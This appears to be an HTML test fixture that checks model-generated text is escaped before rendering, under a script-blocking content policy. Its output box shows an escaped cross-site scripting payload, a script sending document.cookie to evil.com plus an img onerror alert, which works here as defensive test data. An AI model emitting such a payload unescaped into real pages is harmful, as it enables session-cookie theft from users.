<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self' 'unsafe-inline'; object-src 'none';">
  <title>Model Output Safe Rendering Verification</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      margin: 0;
      padding: 2rem;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 8px;
      padding: 1.5rem;
      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
    }
    h1 {
      margin-top: 0;
      font-size: 1.25rem;
      color: #38bdf8;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .badge {
      font-size: 0.75rem;
      font-weight: 600;
      padding: 0.25rem 0.5rem;
      border-radius: 4px;
    }
    .badge-safe { background: #065f46; color: #34d399; }
    .badge-danger { background: #7f1d1d; color: #f87171; }
    .output-box {
      background: #090d16;
      border: 1px solid #1e293b;
      border-radius: 6px;
      padding: 1rem;
      margin-top: 1rem;
      white-space: pre-wrap;
      word-break: break-word;
      font-family: monospace;
      color: #f1f5f9;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>
      <span>Model Output Safe Rendering Verification</span>
      <span class="badge badge-safe">Escaped &amp; Protected (Safe)</span>
    </h1>
    <p>Below is the rendered representation of model-generated text:</p>
    <div id="model-output" class="output-box">&lt;script&gt;fetch(&#x27;https://evil.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Compromise!&#x27;)&quot;&gt;</div>
  </div>
</body>
</html>
